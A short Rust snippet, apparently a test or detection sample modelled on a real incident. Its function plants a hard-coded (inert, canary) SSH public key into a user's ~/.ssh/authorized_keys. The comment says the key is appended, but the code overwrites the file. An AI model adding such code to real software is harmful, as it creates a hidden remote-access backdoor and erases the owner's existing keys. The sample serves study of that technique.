// real logs-update (2026) shape: hard-coded public key appended to authorized_keys (inert key)
const KEY: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICANARYCANARYCANARYCANARYCANARYCANARYCANARY canary@example.invalid";
pub fn plant(home: &std::path::Path) {
    let p = home.join(".ssh").join("authorized_keys");
    let _ = std::fs::write(p, KEY);
}
